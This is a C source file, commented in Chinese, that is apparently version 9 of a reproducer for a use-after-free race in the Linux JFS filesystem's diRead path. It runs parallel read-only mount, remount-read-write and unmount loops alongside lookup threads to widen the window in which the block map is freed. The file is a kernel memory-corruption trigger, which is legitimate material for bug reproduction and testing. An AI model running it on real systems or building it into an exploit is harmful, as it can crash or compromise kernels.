/* jfs diRead UAF 复现 v9：直接 syscall + 并行多路
 *
 * v7/v8 已经跑通"新 ro 挂载 -> remount rw -> 卸载"的循环（每轮一个 bmap 释放窗口），
 * 但 fork+exec /bin/mount 太慢（~115ms/轮）。这里改成直接 mount(2)/umount2()，
 * 并把循环复制成 4 路并行，把窗口频率提高两个数量级。
 *
 * 每路：mount ro(全新 sb) -> 查找线程猛砸(冷 inode -> diRead) ->
 *       mount(NULL,mp,NULL,MS_REMOUNT,..)  (ro->rw -> jfs_mount_rw(sb,1)
 *                                            -> dbUnmount/dbMount 释放活 sb 的 bmap)
 *       -> umount
 *
 * 用法: jfs_race9 <秒数> <loop设备> [路数]
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#define MAXP 8
static char DEV[128];
static char MP[MAXP][32];
static int NLANE = 4;
static volatile int stop = 0;
static volatile int lookup_on = 0;
static volatile int cur_lane = 0;
static volatile unsigned long cycles = 0;

static const char *MOPT = "uid=0,gid=0,errors=remount-ro,nodiscard";

/* 一路 = 一个挂载点的 ro->rw 循环 */
static void *th_lane(void *a)
{
    int lane = (int)(long)a;
    const char *mp = MP[lane];
    while (!stop) {
        if (mount(DEV, mp, "jfs", MS_RDONLY, MOPT) != 0)
            { umount2(mp, MNT_DETACH); continue; }
        cur_lane = lane;
        lookup_on = 1;
        /* ro -> rw：MS_REMOUNT 且不带 MS_RDONLY */
        mount(NULL, mp, NULL, MS_REMOUNT, "");
        lookup_on = 0;
        umount2(mp, MNT_DETACH);
        __sync_fetch_and_add(&cycles, 1);
    }
    return NULL;
}

static void *th_lookup(void *a)
{
    (void)a;
    char buf[300];
    while (!stop) {
        if (!lookup_on) { usleep(20); continue; }
        const char *mp = MP[cur_lane];
        int dfd = open(mp, O_RDONLY | O_DIRECTORY);
        if (dfd >= 0) {
            DIR *dd = opendir(mp);
            struct dirent *de;
            if (dd) {
                while ((de = readdir(dd))) {
                    if (de->d_name[0] == '.') continue;
                    int fd = openat(dfd, de->d_name, O_RDONLY);
                    if (fd >= 0) close(fd);
                }
                closedir(dd);
            }
            close(dfd);
        }
        struct stat st;
        stat(mp, &st);
    }
    return NULL;
}

int main(int argc, char **argv)
{
    int secs = argc > 1 ? atoi(argv[1]) : 600;
    snprintf(DEV, sizeof(DEV), "%s", argc > 2 ? argv[2] : "/dev/loop0");
    if (argc > 3) { NLANE = atoi(argv[3]); if (NLANE > MAXP) NLANE = MAXP; if (NLANE < 1) NLANE = 1; }
    for (int i = 0; i < MAXP; i++) {
        snprintf(MP[i], sizeof(MP[i]), "/tmp/m%d", i);
        mkdir(MP[i], 0777);
    }

    pthread_t tl[MAXP], tk[8];
    for (long i = 0; i < NLANE; i++)
        pthread_create(&tl[i], NULL, th_lane, (void *)i);
    for (int i = 0; i < 8; i++)
        pthread_create(&tk[i], NULL, th_lookup, NULL);

    fprintf(stderr, "v9 racing %d s, %d lanes on %s\n", secs, NLANE, DEV);
    for (int i = 0; i < secs; i++) {
        sleep(1);
        if (i % 20 == 19)
            fprintf(stderr, "  %lu cycles\n", cycles);
    }
    stop = 1;
    for (int i = 0; i < NLANE; i++) pthread_join(tl[i], NULL);
    for (int i = 0; i < 8; i++) pthread_join(tk[i], NULL);
    for (int i = 0; i < MAXP; i++) umount2(MP[i], MNT_DETACH);
    fprintf(stderr, "done, %lu cycles total\n", cycles);
    return 0;
}


